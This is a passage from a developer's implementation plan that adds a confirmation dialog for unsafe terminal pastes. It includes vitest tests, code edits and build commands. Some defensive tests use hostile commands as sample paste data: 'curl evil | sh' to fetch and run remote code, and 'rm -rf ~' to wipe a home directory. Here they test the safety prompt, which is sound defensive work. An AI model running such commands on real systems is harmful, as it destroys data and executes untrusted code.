	editor.mount(container, core, host);
	const root = container.querySelector<HTMLElement>(".terminal-editor")!;
	return { editor, core, root, sent, raw };
}

function paste(root: HTMLElement, clipboard: { text?: string; types?: string[] }): Event {
	const event = new Event("paste", { bubbles: true, cancelable: true });
	Object.defineProperty(event, "clipboardData", {
		value: {
			types: clipboard.types ?? (clipboard.text === undefined ? [] : ["text/plain"]),
			getData: () => clipboard.text ?? "",
			files: [],
		},
	});
	root.dispatchEvent(event);
	return event;
}

describe("pasting into the line editor", () => {
	it("inserts into the buffer while the editor owns the line", () => {
		const { core, root } = mount();
		core.feed(encode("\x1b]7000;v=1;input-ready=1\x07"));
		paste(root, { text: "git status" });
		expect(root.textContent).toContain("git status");
	});

	it("sends the text to the child that owns the line", () => {
		const { core, root, raw } = mount();
		core.feed(encode("\x1b]7000;v=1;input-ready=1\x07\x1b]7000;v=1;input-released=1\x07"));
		paste(root, { text: "one\ntwo" });
		expect(raw).toEqual(["one\rtwo"]);
	});

	it("brackets the paste when the child asked for bracketed paste", () => {
		const { core, root, raw } = mount();
		core.feed(encode("\x1b]7000;v=1;input-released=1\x07\x1b[?2004h"));
		paste(root, { text: "one\ntwo" });
		expect(raw).toEqual(["\x1b[200~one\rtwo\x1b[201~"]);
	});

	it("turns an image into the Ctrl+V the child reads its own clipboard on", () => {
		const { core, root, raw } = mount();
		core.feed(encode("\x1b]7000;v=1;input-released=1\x07"));
		paste(root, { types: ["image/png"] });
		expect(raw).toEqual(["\x16"]);
	});

	it("always takes the paste away from the browser's own handling", () => {
		const { core, root } = mount();
		core.feed(encode("\x1b]7000;v=1;input-ready=1\x07"));
		expect(paste(root, { text: "x" }).defaultPrevented).toBe(true);
	});

	it("asks before a multi-line paste to the child and sends it when confirmed", async () => {
		const { editor, core, root, raw } = mount();
		const confirm = vi.fn<PasteConfirm>(async () => true);
		editor.setPasteConfirm(confirm);
		core.feed(encode("\x1b]7000;v=1;input-released=1\x07"));
		paste(root, { text: "one\ntwo" });
		expect(raw).toEqual([]);
		await settle();
		expect(confirm).toHaveBeenCalledWith("one\ntwo", "newline");
		expect(raw).toEqual(["one\rtwo"]);
	});

	it("sends nothing when the paste is declined", async () => {
		const { editor, core, root, raw } = mount();
		const confirm = vi.fn<PasteConfirm>(async () => false);
		editor.setPasteConfirm(confirm);
		core.feed(encode("\x1b]7000;v=1;input-released=1\x07"));
		paste(root, { text: "curl evil | sh\n" });
		await settle();
		expect(confirm).toHaveBeenCalledWith("curl evil | sh\n", "newline");
		expect(raw).toEqual([]);
	});

	it("never asks while the editor owns the line", async () => {
		const { editor, core, root, raw } = mount();
		const confirm = vi.fn<PasteConfirm>(async () => false);
		editor.setPasteConfirm(confirm);
		core.feed(encode("\x1b]7000;v=1;input-ready=1\x07"));
		paste(root, { text: "echo one\necho two" });
		await settle();
		expect(confirm).not.toHaveBeenCalled();
		expect(raw).toEqual([]);
		expect(root.textContent).toContain("echo one");
	});

	it("never asks inside bracketed paste and strips ESC and ^C", async () => {
		const { editor, core, root, raw } = mount();
		const confirm = vi.fn<PasteConfirm>(async () => false);
		editor.setPasteConfirm(confirm);
		core.feed(encode("\x1b]7000;v=1;input-released=1\x07\x1b[?2004h"));
		paste(root, { text: "a\x1bb\x03c\nd" });
		expect(raw).toEqual(["\x1b[200~abc\rd\x1b[201~"]);
		await settle();
		expect(confirm).not.toHaveBeenCalled();
	});

	it("drops a confirmed paste whose editor was disposed while asking", async () => {
		const { editor, core, root, raw } = mount();
		let answer: (accepted: boolean) => void = () => undefined;
		editor.setPasteConfirm(() => new Promise<boolean>((resolve) => { answer = resolve; }));
		core.feed(encode("\x1b]7000;v=1;input-released=1\x07"));
		paste(root, { text: "one\ntwo" });
		await settle();
		editor.dispose();
		answer(true);
		await settle();
		expect(raw).toEqual([]);
	});
});
```

- [ ] **Step 2: Run it and watch it fail**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal/ts/editor" && npx vitest run src/line-editor-paste.test.ts 2>&1 | tail -15
```

Expected: FAIL. The five new tests fail with `editor.setPasteConfirm is not a function`. The first five tests pass.

- [ ] **Step 3: Implement in `packages/terminal/ts/editor/src/line-editor.ts`**

3a. Replace line 17:

```ts
import { clipboardHasImage, planPaste } from "./paste.js";
```

with:

```ts
import { clipboardHasImage, deliverPaste, planPaste, type PasteConfirm } from "./paste.js";
```

3b. Replace line 53:

```ts
	private reportedDraft = "";
```

with:

```ts
	private reportedDraft = "";
	private pasteConfirm: PasteConfirm | null = null;
```

3c. Replace `:137-140`:

```ts
	setStrings(strings: TerminalStrings): void {
		this.strings = strings;
		this.render();
	}
```

with:

```ts
	setStrings(strings: TerminalStrings): void {
		this.strings = strings;
		this.render();
	}

	setPasteConfirm(confirm: PasteConfirm | null): void {
		this.pasteConfirm = confirm;
	}
```

3d. The line numbers of the paste handler move down by 5 after 3b and 3c. In `onPaste`, replace:

```ts
		if (plan.kind === "insert") {
			this.apply({ kind: "insert", text: plan.text });
			return;
		}
		if (plan.kind === "send") this.host?.sendRaw(plan.data);
	};
```

with:

```ts
		if (plan.kind === "insert") {
			this.apply({ kind: "insert", text: plan.text });
			return;
		}
		const host = this.host;
		const root = this.root;
		if (!host) return;
		void deliverPaste(
			plan,
			(data) => {
				if (this.root === root) host.sendRaw(data);
			},
			this.pasteConfirm ?? undefined,
		);
	};
```

Do not touch `dispose()`. It already sets `this.root = null` (`:167`), and that is what drops a late confirmation.

- [ ] **Step 4: Run the editor suite**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal/ts/editor" && npx vitest run 2>&1 | tail -6
```

Expected: `line-editor-paste.test.ts` reports 10 passed, and the file summary shows `0 failed`. The total `Tests` line must equal the Task 0 baseline for editor plus 33: `paste.test.ts` went from 13 to 41 (+28) and `line-editor-paste.test.ts` from 5 to 10 (+5).

- [ ] **Step 5: Rebuild the dist so `ts/react` sees the new editor API, and check the line limit**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run build:ts && npm run check:boundaries
```

Expected: `tsc -b` exits 0; then `boundary check passed` and `no ownership timers found (…)`. `line-editor.ts` stays under 600 lines (it was 562).

- [ ] **Step 6: Commit**

```bash
cd "$(git rev-parse --show-toplevel)" && git add packages/terminal/ts/editor/src/line-editor.ts packages/terminal/ts/editor/src/line-editor-paste.test.ts && git commit -m "feat(terminal): line editor confirms an unsafe paste to the child

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

### Task 3: `TerminalSurface` wires `host.confirmPaste` to both paste paths

**Files:**
- Modify: `packages/terminal/ts/react/src/TerminalSurface.tsx:2`, after `:125`, after `:172`, after `:245`, `:303-353`
- Modify: `packages/terminal/ts/react/src/index.ts:13-21`
- Rewrite: `packages/terminal/ts/react/src/TerminalSurface.paste.test.tsx`

**Interfaces:**
- Consumes: `deliverPaste`, `planPaste` (Task 1); `LineEditor.setPasteConfirm` (Task 2); `HostCapabilities.confirmPaste` (Task 1).
- Produces: `@operator/terminal-react` exports `type PasteUnsafeReason`. A `TerminalSurface` whose `host.confirmPaste` is set asks before an unsafe paste on the primary screen (through the line editor) and on the alternate screen. With no `host`, or a host without `confirmPaste`, the behaviour is unchanged.

- [ ] **Step 1: Write the failing tests: replace the whole of `packages/terminal/ts/react/src/TerminalSurface.paste.test.tsx` with**

```tsx
import { readFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { act, render } from "@testing-library/react";
import { beforeAll, describe, expect, it, vi } from "vitest";
import {
	createTerminalCore,
	initTerminalCore,
	type FontConfig,
	type HostCapabilities,
	type TerminalCore,
} from "@operator/terminal-core";
import { TerminalSurface, warpDarkTheme } from "./index";

const font: FontConfig = {
	family: "ui-monospace, monospace",
	sizePx: 14,
	lineHeight: 1.2,
	weight: 400,
	letterSpacingPx: 0,
	ligatures: false,
};
const theme = warpDarkTheme;

const feed = (core: TerminalCore, text: string) => core.feed(new TextEncoder().encode(text));
const settle = () => new Promise((resolve) => setTimeout(resolve, 0));

type Confirm = NonNullable<HostCapabilities["confirmPaste"]>;

beforeAll(async () => {
	const bytes = await readFile(
		join(dirname(fileURLToPath(import.meta.url)), "..", "..", "core", "wasm", "vt_core_bg.wasm"),
	);
	await initTerminalCore(
		bytes.buffer.slice(bytes.byteOffset, bytes.byteOffset + bytes.byteLength) as ArrayBuffer,
	);
});

function pasteOn(surface: HTMLElement, text: string): Event {
	const event = new Event("paste", { bubbles: true, cancelable: true });
	Object.defineProperty(event, "clipboardData", {
		value: { types: ["text/plain"], getData: () => text, files: [] },
	});
	surface.dispatchEvent(event);
	return event;
}

function hostWith(confirmPaste: Confirm): HostCapabilities {
	return {
		writeClipboard: async () => undefined,
		readClipboard: async () => "",
		openLink: async () => undefined,
		confirmPaste,
	};
}

function mountAlt(host?: HostCapabilities) {
	const onSendRaw = vi.fn();
	const core = createTerminalCore({ columns: 16, scrollback: 100 });
	const { container } = render(
		<TerminalSurface
			core={core}
			theme={theme}
			font={font}
			altScreenActive
			host={host}
			onSend={() => undefined}
			onSendRaw={onSendRaw}
		/>,
	);
	act(() => {
		feed(core, "\x1b[?1049h");
	});
	const surface = container.querySelector(".terminal-host") as HTMLElement;
	return { core, surface, onSendRaw };
}

function mountPrimary(host: HostCapabilities) {
	const onSendRaw = vi.fn();
	const core = createTerminalCore({ columns: 40, scrollback: 100 });
	const { container } = render(
		<TerminalSurface
			core={core}
			theme={theme}
			font={font}
			altScreenActive={false}
			host={host}
			onSend={() => undefined}
			onSendRaw={onSendRaw}
		/>,
	);
	act(() => {
		feed(core, "\x1b]7000;v=1;input-released=1\x07");
	});
	const editor = container.querySelector(".terminal-editor") as HTMLElement;
	return { core, editor, onSendRaw };
}

const pastedCalls = (onSendRaw: ReturnType<typeof vi.fn>, marker: string) =>
	onSendRaw.mock.calls.filter(([data]) => typeof data === "string" && data.includes(marker));

describe("pasting into the alternate screen", () => {
	it("sends the paste to the child, bracketed when it asked for brackets", () => {
		const { core, surface, onSendRaw } = mountAlt();
		expect(pasteOn(surface, "one\ntwo").defaultPrevented).toBe(true);
		expect(onSendRaw).toHaveBeenNthCalledWith(1, "one\rtwo");
		act(() => {
			feed(core, "\x1b[?2004h");
		});
		pasteOn(surface, "one\ntwo");
		expect(onSendRaw).toHaveBeenNthCalledWith(2, "\x1b[200~one\rtwo\x1b[201~");
	});

	it("asks the host first and sends nothing when the paste is declined", async () => {
		const confirm = vi.fn<Confirm>(async () => false);
		const { surface, onSendRaw } = mountAlt(hostWith(confirm));
		pasteOn(surface, "one\ntwo");
		await settle();
		expect(confirm).toHaveBeenCalledWith("one\ntwo", "newline");
		expect(pastedCalls(onSendRaw, "one")).toEqual([]);
	});

	it("sends the exact bytes once when the host confirms", async () => {
		const confirm = vi.fn<Confirm>(async () => true);
		const { surface, onSendRaw } = mountAlt(hostWith(confirm));
		pasteOn(surface, "one\ntwo");
		await settle();
		expect(pastedCalls(onSendRaw, "one")).toEqual([["one\rtwo"]]);
	});

	it("never asks inside bracketed paste and strips ESC and ^C", async () => {
		const confirm = vi.fn<Confirm>(async () => false);
		const { core, surface, onSendRaw } = mountAlt(hostWith(confirm));
		act(() => {
			feed(core, "\x1b[?2004h");
		});
		pasteOn(surface, "a\x1bb\x03c");
		await settle();
		expect(confirm).not.toHaveBeenCalled();
		expect(pastedCalls(onSendRaw, "abc")).toEqual([["\x1b[200~abc\x1b[201~"]]);
	});
});

describe("pasting on the primary screen while a child owns the line", () => {
	it("asks the host first and sends nothing when the paste is declined", async () => {
		const confirm = vi.fn<Confirm>(async () => false);
		const { editor, onSendRaw } = mountPrimary(hostWith(confirm));
		pasteOn(editor, "rm -rf ~\n");
		await settle();
		expect(confirm).toHaveBeenCalledWith("rm -rf ~\n", "newline");
		expect(pastedCalls(onSendRaw, "rm -rf")).toEqual([]);
	});

	it("sends the exact bytes once when the host confirms", async () => {
		const confirm = vi.fn<Confirm>(async () => true);
		const { editor, onSendRaw } = mountPrimary(hostWith(confirm));
		pasteOn(editor, "one\ntwo");
		await settle();
		expect(pastedCalls(onSendRaw, "one")).toEqual([["one\rtwo"]]);
	});
});
```

- [ ] **Step 2: Run it and watch it fail**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal/ts/react" && npx vitest run src/TerminalSurface.paste.test.tsx 2>&1 | tail -15
```

Expected: FAIL. The two "declined" tests fail: `confirm` was never called and the bytes were sent. The first test and "never asks inside bracketed paste" pass: the Task 1 dist already strips ESC/^C. The two "confirms" tests may pass by accident, because without wiring the bytes are sent unasked.

- [ ] **Step 3: Implement in `packages/terminal/ts/react/src/TerminalSurface.tsx`**

3a. Replace line 2:

```ts
import { clipboardHasImage, encodeKey, LineEditor, planPaste } from "@operator/terminal-editor";
```

with:

```ts
import { clipboardHasImage, deliverPaste, encodeKey, LineEditor, planPaste } from "@operator/terminal-editor";
```

3b. After line 125 (`	resolveFirstPathRef.current = resolveFirstPath;`) insert:

```ts
	const confirmPaste = host?.confirmPaste;
	const confirmPasteRef = useRef(confirmPaste);
	confirmPasteRef.current = confirmPaste;
```

3c. In the mount effect, replace:

```ts
		editor.setTheme(theme);
		editor.setFont(font);
		editor.setStrings(strings);
```

with:

```ts
		editor.setTheme(theme);
		editor.setFont(font);
		editor.setStrings(strings);
		editor.setPasteConfirm(confirmPasteRef.current ?? null);
```

3d. Replace the strings effect:

```ts
	useLayoutEffect(() => {
		editorRef.current?.setStrings(strings);
	}, [strings]);
```

with:

```ts
	useLayoutEffect(() => {
		editorRef.current?.setStrings(strings);
	}, [strings]);

	useLayoutEffect(() => {
		editorRef.current?.setPasteConfirm(confirmPaste ?? null);
	}, [confirmPaste]);
```

3e. In the alt-screen effect (originally `:303-353`), replace:

```ts
		const appCursor = () => core.snapshot().applicationCursorKeys;
```

with:

```ts
		const appCursor = () => core.snapshot().applicationCursorKeys;
		let active = true;
```

Then replace:

```ts
			const plan = planPaste({
				text: data?.getData("text/plain") ?? "",
				hasImage: clipboardHasImage(data),
				owned: false,
				bracketedPaste: core.snapshot().bracketedPaste,
			});
			if (plan.kind === "send") onSendRaw(plan.data);
		};
```

with:

```ts
			const plan = planPaste({
				text: data?.getData("text/plain") ?? "",
				hasImage: clipboardHasImage(data),
				owned: false,
				bracketedPaste: core.snapshot().bracketedPaste,
			});
			void deliverPaste(
				plan,
				(bytes) => {
					if (active) onSendRaw(bytes);
				},
				hostCapsRef.current?.confirmPaste,
			);
		};
```

Then in that effect's cleanup, replace:

```ts
		return () => {
			blockHost.removeEventListener("keydown", onKeyDown);
			blockHost.removeEventListener("paste", onPaste);
```

with:

```ts
		return () => {
			active = false;
			blockHost.removeEventListener("keydown", onKeyDown);
			blockHost.removeEventListener("paste", onPaste);
```

The existing comment above `onPaste` ("The alt screen has no line editor…") stays.

3f. In `packages/terminal/ts/react/src/index.ts`, replace:

```ts
	HostCapabilities,
	PathCandidate,
```

with:

```ts
	HostCapabilities,
	PasteUnsafeReason,
	PathCandidate,
```

- [ ] **Step 4: Build and run the react suite**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run build:ts && cd ts/react && npx vitest run 2>&1 | tail -6
```

Expected: `tsc -b` exits 0. `TerminalSurface.paste.test.tsx` reports 6 passed, and the suite shows `0 failed`. The `Tests` total equals the Task 0 react baseline plus 5.

- [ ] **Step 5: Boundaries**

```bash
cd "$(git rev-parse --show-toplevel)/packages/terminal" && npm run check:boundaries
```

Expected: `boundary check passed`.

- [ ] **Step 6: Commit**

```bash
cd "$(git rev-parse --show-toplevel)" && git add packages/terminal/ts/react/src/TerminalSurface.tsx packages/terminal/ts/react/src/TerminalSurface.paste.test.tsx packages/terminal/ts/react/src/index.ts && git commit -m "feat(terminal): TerminalSurface asks the host before an unsafe paste

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

### Task 4: Operator's paste confirm dialog

**Files:**
- Create: `frontend/src/renderer/hooks/usePasteConfirm.tsx`
- Create: `frontend/src/renderer/hooks/usePasteConfirm.test.tsx`
- Modify: `frontend/src/renderer/i18n/en.json` (insert after line 917, `"terminal.panelAria": "{{title}} terminal",`)

**Interfaces:**
- Consumes: `type PasteUnsafeReason` from `@operator/terminal-react` (Task 3). It is type-only, so the frontend test setup's `vi.mock("@operator/terminal-react", …)` (`frontend/src/renderer/test/setup.ts:6`) does not interfere. It also uses `ConfirmDialog` (`frontend/src/renderer/components/ConfirmDialog.tsx:33-94`: props `open`, `title`, `description`, `confirmLabel`, `onConfirm`, `onOpenChange`; its Cancel button reads `t("confirm.cancel")` = "Cancel", `en.json:119`).
- Produces:
  - `export type PasteConfirmFn = (preview: string, reason: PasteUnsafeReason) => Promise<boolean>;`
  - `export function pastePreviewLines(preview: string): { lines: string[]; hidden: number }`: the first 5 lines, each cut to 200 characters plus `…`, and the number of lines not shown.
  - `export function usePasteConfirm(): { confirmPaste: PasteConfirmFn; dialog: JSX.Element }`. `confirmPaste` is stable across renders. A new request answers any open one with `false`. Unmounting answers the open one with `false`.

- [ ] **Step 1: Add the copy to `frontend/src/renderer/i18n/en.json`**

After the line `	"terminal.panelAria": "{{title}} terminal",` (line 917) insert:

```json
	"terminal.pasteConfirm": "Paste",
	"terminal.pasteConfirmTitle": "Paste into the terminal?",
	"terminal.pasteMoreLines_one": "…and {{count}} more line",
	"terminal.pasteMoreLines_other": "…and {{count}} more lines",
	"terminal.pasteReasonControl": "It contains control characters (shown as ^ below) that act like key presses.",
	"terminal.pasteReasonNewline": "It has more than one line, so each line may run as a command.",
	"terminal.pasteReasonPasteEnd": "It contains an end-of-paste sequence that can make the rest run as typed commands.",
```

Check that the file is still valid JSON:

```bash
cd "$(git rev-parse --show-toplevel)/frontend" && node -e "JSON.parse(require('fs').readFileSync('src/renderer/i18n/en.json','utf8')); console.log('en.json ok')"
```

Expected: `en.json ok`.

- [ ] **Step 2: Write the failing test `frontend/src/renderer/hooks/usePasteConfirm.test.tsx`**

```tsx
import { act, render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { useEffect } from "react";
import { describe, expect, it } from "vitest";
import { pastePreviewLines, usePasteConfirm, type PasteConfirmFn } from "./usePasteConfirm";

function Harness({ onReady }: { onReady: (confirm: PasteConfirmFn) => void }) {
	const { confirmPaste, dialog } = usePasteConfirm();
	useEffect(() => {
		onReady(confirmPaste);
	}, [confirmPaste, onReady]);
	return dialog;
}

function mount() {
	let confirm: PasteConfirmFn = async () => false;
	const view = render(
		<Harness
			onReady={(next) => {
				confirm = next;
			}}
		/>,
	);
	const ask = (preview: string, reason: Parameters<PasteConfirmFn>[1]) => {
		let answer: Promise<boolean> = Promise.resolve(false);
		act(() => {
			answer = confirm(preview, reason);
		});
		return answer;
	};
	return { view, ask };
}

describe("usePasteConfirm", () => {
	it("shows the reason and the paste, and answers yes on Paste", async () => {
		const { ask } = mount();
		const answer = ask("git pull\nnpm install", "newline");
		const dialog = screen.getByRole("dialog", { name: "Paste into the terminal?" });
		expect(dialog).toHaveTextContent("It has more than one line, so each line may run as a command.");
		expect(screen.getByTestId("paste-preview").textContent).toBe("git pull\nnpm install");
		await userEvent.click(screen.getByRole("button", { name: "Paste" }));
		await expect(answer).resolves.toBe(true);
		await waitFor(() => expect(screen.queryByRole("dialog")).toBeNull());
	});

	it("answers no on Cancel", async () => {
		const { ask } = mount();
		const answer = ask("one\ntwo", "newline");
		await userEvent.click(screen.getByRole("button", { name: "Cancel" }));
		await expect(answer).resolves.toBe(false);
	});

	it("answers no when the dialog is closed", async () => {
		const { ask } = mount();
		const answer = ask("one\ntwo", "newline");
		await userEvent.click(screen.getByRole("button", { name: "Close dialog" }));
		await expect(answer).resolves.toBe(false);
	});

	it("answers an earlier request no when a new one arrives", async () => {
		const { ask } = mount();
		const first = ask("first\nline", "newline");
		const second = ask("second\nline", "newline");
		await expect(first).resolves.toBe(false);
		expect(screen.getByTestId("paste-preview").textContent).toBe("second\nline");
		await userEvent.click(screen.getByRole("button", { name: "Paste" }));
		await expect(second).resolves.toBe(true);
	});

	it("answers no when the terminal goes away while asking", async () => {
		const { view, ask } = mount();
		const answer = ask("one\ntwo", "newline");
		view.unmount();
		await expect(answer).resolves.toBe(false);
	});

	it("shows control characters as caret notation with the control reason", () => {
		const { ask } = mount();
		void ask("echo ^[[31m", "control");
		expect(screen.getByRole("dialog")).toHaveTextContent(
			"It contains control characters (shown as ^ below) that act like key presses.",
		);
		expect(screen.getByTestId("paste-preview").textContent).toBe("echo ^[[31m");
	});

	it("limits the preview to five lines of 200 characters and counts the rest", () => {
		const long = "x".repeat(250);
		expect(pastePreviewLines(`${long}\n2\n3\n4\n5\n6\n7`)).toEqual({
			lines: [`${"x".repeat(200)}…`, "2", "3", "4", "5"],
			hidden: 2,
		});
		expect(pastePreviewLines("only")).toEqual({ lines: ["only"], hidden: 0 });
		const { ask } = mount();
		void ask("1\n2\n3\n4\n5\n6\n7", "newline");
		expect(screen.getByTestId("paste-preview").textContent).toBe("1\n2\n3\n4\n5");
		expect(screen.getByRole("dialog")).toHaveTextContent("…and 2 more lines");
	});
});
```

- [ ] **Step 3: Run it and watch it fail**

```bash
cd "$(git rev-parse --show-toplevel)/frontend" && npx vitest run src/renderer/hooks/usePasteConfirm.test.tsx 2>&1 | tail -10
```

Expected: FAIL, with `Failed to resolve import "./usePasteConfirm"` (or `Cannot find module`).

- [ ] **Step 4: Create `frontend/src/renderer/hooks/usePasteConfirm.tsx`**

```tsx
import { useCallback, useEffect, useRef, useState } from "react";
import { useTranslation } from "react-i18next";
import type { PasteUnsafeReason } from "@operator/terminal-react";
import { ConfirmDialog } from "../components/ConfirmDialog";

export type PasteConfirmFn = (preview: string, reason: PasteUnsafeReason) => Promise<boolean>;

type PendingPaste = Readonly<{
	preview: string;
	reason: PasteUnsafeReason;
	resolve: (accepted: boolean) => void;
}>;

const PREVIEW_LINES = 5;
const PREVIEW_LINE_CHARS = 200;

const reasonKeys = {
	newline: "terminal.pasteReasonNewline",
	control: "terminal.pasteReasonControl",
	"paste-end": "terminal.pasteReasonPasteEnd",
} as const satisfies Record<PasteUnsafeReason, string>;

export function pastePreviewLines(preview: string): { lines: string[]; hidden: number } {
	const all = preview.split("\n");
	return {
		lines: all
			.slice(0, PREVIEW_LINES)
			.map((line) => (line.length > PREVIEW_LINE_CHARS ? `${line.slice(0, PREVIEW_LINE_CHARS)}…` : line)),
		hidden: Math.max(0, all.length - PREVIEW_LINES),
	};
}

export function usePasteConfirm() {
	const { t } = useTranslation();
	const [pending, setPending] = useState<PendingPaste | null>(null);
	const pendingRef = useRef<PendingPaste | null>(null);

	const settle = useCallback((accepted: boolean) => {
		const current = pendingRef.current;
		pendingRef.current = null;
		setPending(null);
		current?.resolve(accepted);
	}, []);

	useEffect(() => () => settle(false), [settle]);

	const confirmPaste = useCallback<PasteConfirmFn>(
		(preview, reason) =>
			new Promise<boolean>((resolve) => {
				pendingRef.current?.resolve(false);
				const next: PendingPaste = { preview, reason, resolve };
				pendingRef.current = next;
				setPending(next);
			}),
		[],
	);

	const shown = pending ? pastePreviewLines(pending.preview) : null;
	const dialog = (
		<ConfirmDialog
			open={pending !== null}
			title={t("terminal.pasteConfirmTitle")}
			description={
				pending && shown ? (
					<>
						<p>{t(reasonKeys[pending.reason])}</p>
						<pre
							data-testid="paste-preview"
							className="mt-2 max-h-40 overflow-auto whitespace-pre-wrap break-all rounded-md border border-(--color-border-settings-dialog) p-2 font-mono text-caption text-settings-label"
						>
							{shown.lines.join("\n")}
						</pre>
						{shown.hidden > 0 ? (
							<p className="mt-1">{t("terminal.pasteMoreLines", { count: shown.hidden })}</p>
						) : null}
					</>
				) : null
			}
			confirmLabel={t("terminal.pasteConfirm")}
			onConfirm={() => settle(true)}
			onOpenChange={(open) => {
				if (!open) settle(false);
			}}
		/>
	);

	return { confirmPaste, dialog };
}
```

- [ ] **Step 5: Run it and watch it pass**

```bash
cd "$(git rev-parse --show-toplevel)/frontend" && npx vitest run src/renderer/hooks/usePasteConfirm.test.tsx 2>&1 | tail -6
```

Expected: `Test Files  1 passed (1)`, `Tests  7 passed (7)`.

If "answers no when the dialog is closed" cannot find `Close dialog`: the accessible name comes from `t("confirm.close")` = "Close dialog" (`en.json:120`, `ConfirmDialog.tsx:53`). Do not change `ConfirmDialog`; check the key's value in `en.json` instead.

- [ ] **Step 6: Commit**

```bash
cd "$(git rev-parse --show-toplevel)" && git add frontend/src/renderer/hooks/usePasteConfirm.tsx frontend/src/renderer/hooks/usePasteConfirm.test.tsx frontend/src/renderer/i18n/en.json && git commit -m "feat(frontend): paste confirm dialog for unsafe terminal pastes

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>"
```

---

### Task 5: Wire the dialog into `BlockTerminal`

`BlockTerminal` is the only `TerminalSurface` host in Operator (`frontend/src/renderer/components/BlockTerminal.tsx:637`; `TerminalPane.tsx:1157` renders `BlockTerminal`). It serves shell panes and Claude Code panes alike.

**Files:**
- Modify: `frontend/src/renderer/components/BlockTerminal.tsx:24`, `:464`, `:487-490`, `:637`
- Modify: `frontend/src/renderer/components/BlockTerminal.test.tsx:2`, `:38`, `:161`, append at end of file (after line 884)

**Interfaces:**
- Consumes: `usePasteConfirm` (Task 4); `HostCapabilities.confirmPaste` (Task 1).
- Produces: every Operator terminal pane asks through the dialog.

- [ ] **Step 1: Write the failing test**

1a. In `frontend/src/renderer/components/BlockTerminal.test.tsx`, after line 2 (`import { act, render, screen, waitFor } from "@testing-library/react";`) insert:

```ts
import userEvent from "@testing-library/user-event";
```

1b. In the `mockState` host type, replace (at `:37-38`, indented five tabs):

```ts
					secretPatterns?: readonly { source: string; flags?: string }[];
					predictiveEcho?: Readonly<{ thresholdMs: number }>;
```

with:

```ts
					secretPatterns?: readonly { source: string; flags?: string }[];
					predictiveEcho?: Readonly<{ thresholdMs: number }>;
					confirmPaste?: (preview: string, reason: "newline" | "control" | "paste-end") => Promise<boolean>;
```

1c. In the mocked `TerminalSurface` props' `host` type, replace (at `:160-161`, indented four tabs):

```ts
				secretPatterns?: readonly { source: string; flags?: string }[];
				predictiveEcho?: Readonly<{ thresholdMs: number }>;
```

with:

```ts
				secretPatterns?: readonly { source: string; flags?: string }[];
				predictiveEcho?: Readonly<{ thresholdMs: number }>;
				confirmPaste?: (preview: string, reason: "newline" | "control" | "paste-end") => Promise<boolean>;
```

(Both blocks are unique by indentation. If an Edit tool says the match is not unique, include the following line, `}` or `};`, in the match.)

1d. Append at the very end of the file:

```tsx

describe("BlockTerminal paste confirm", () => {
	it("asks before an unsafe paste and answers with the button pressed", async () => {
		renderTerminal();
		await waitFor(() => expect(mockState.host?.confirmPaste).toBeTypeOf("function"));
		let answer: Promise<boolean> = Promise.resolve(false);
		act(() => {
			answer = mockState.host!.confirmPaste!("git pull\nnpm install", "newline");
		});
		const dialog = await screen.findByRole("dialog", { name: "Paste into the terminal?" });
		expect(dialog).toHaveTextContent("git pull");
		await userEvent.click(screen.getByRole("button", { name: "Paste" }));
		await expect(answer).resolves.toBe(true);
	});

	it("answers no when the user cancels", async () => {
		renderTerminal();
		await waitFor(() => expect(mockState.host?.confirmPaste).toBeTypeOf("function"));
		let answer: Promise<boolean> = Promise.resolve(true);
		act(() => {
			answer = mockState.host!.confirmPaste!("a\x1b", "control");
		});
		await screen.findByRole("dialog", { name: "Paste into the terminal?" });
		await userEvent.click(screen.getByRole("button", { name: "Cancel" }));
		await expect(answer).resolves.toBe(false);
	});
});
```

- [ ] **Step 2: Run it and watch it fail**

```bash
cd "$(git rev-parse --show-toplevel)/frontend" && npx vitest run src/renderer/components/BlockTerminal.test.tsx 2>&1 | tail -10
```

Expected: FAIL. The 2 new tests time out in `waitFor` because `mockState.host?.confirmPaste` is `undefined`. Every other test passes.

- [ ] **Step 3: Implement in `frontend/src/renderer/components/BlockTerminal.tsx`**

3a. After line 24 (`import { externalEditorLabel } from "../lib/open-files-in";`) insert:

```ts
import { usePasteConfirm } from "../hooks/usePasteConfirm";
```

3b. After line 464 (`	const predictiveThresholdMs = predictiveEcho ? terminalPredictiveEchoThresholdMs : undefined;`) insert:

```ts
	const { confirmPaste, dialog: pasteConfirmDialog } = usePasteConfirm();
```

(This is above the `if (coreError || !core)` early return at `:563`, so hook order stays stable.)

3c. In the `host` `useMemo`, replace:

```ts
			secretPatterns,
			...(predictiveThresholdMs === undefined ? {} : { predictiveEcho: { thresholdMs: predictiveThresholdMs } }),
		}),
		[clipboard, workspacePath, secretPatterns, predictiveThresholdMs, openFile],
	);
```

with:

```ts
			secretPatterns,
			...(predictiveThresholdMs === undefined ? {} : { predictiveEcho: { thresholdMs: predictiveThresholdMs } }),
			confirmPaste,
		}),
		[clipboard, workspacePath, secretPatterns, predictiveThresholdMs, openFile, confirmPaste],
	);
```

3d. In the final `return`, replace:

```tsx
			<TerminalSurface {...surfaceProps} />
```

with:

```tsx
			<TerminalSurface {...surfaceProps} />
			{pasteConfirmDialog}
```

- [ ] **Step 4: Run it and watch it pass**

```bash
cd "$(git rev-parse --show-toplevel)/frontend" && npx vitest run src/renderer/components/BlockTerminal.test.tsx src/renderer/hooks/usePasteConfirm.test.tsx 2>&1 | tail -6
```

Expected: `Test Files  2 passed (2)`, `0 failed`. The `Tests` total equals the Task 0 BlockTerminal baseline + 2 + 7.

- [ ] **Step 5: Typecheck and lint the frontend**

```bash
cd "$(git rev-parse --show-toplevel)/frontend" && npx tsc --noEmit -p . && echo "tsc ok" && npx eslint src/renderer/hooks/usePasteConfirm.tsx src/renderer/hooks/usePasteConfirm.test.tsx src/renderer/components/BlockTerminal.tsx src/renderer/components/BlockTerminal.test.tsx
```

